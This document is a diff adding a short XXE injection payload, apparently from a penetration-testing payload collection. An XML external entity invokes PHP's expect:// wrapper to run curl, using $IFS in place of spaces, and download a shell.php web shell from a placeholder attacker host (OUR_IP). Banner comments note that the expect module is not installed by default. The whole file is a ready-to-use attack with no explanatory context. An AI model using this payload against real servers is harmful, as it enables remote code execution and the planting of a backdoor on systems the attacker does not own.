@@ -1,0 +1,19 @@
+#################### USING PHP EXPECT MODULE ####################
+#################### AVOID SPECIAL CHARS !!! ####################
+<?xml version="1.0"?>
+<!DOCTYPE email [ <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"> ]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+
+#################### PHP EXPECT MODULE IS NOT INSTALLED BY DEFAULT !!! ####################
+
+
+
+
+
+
+
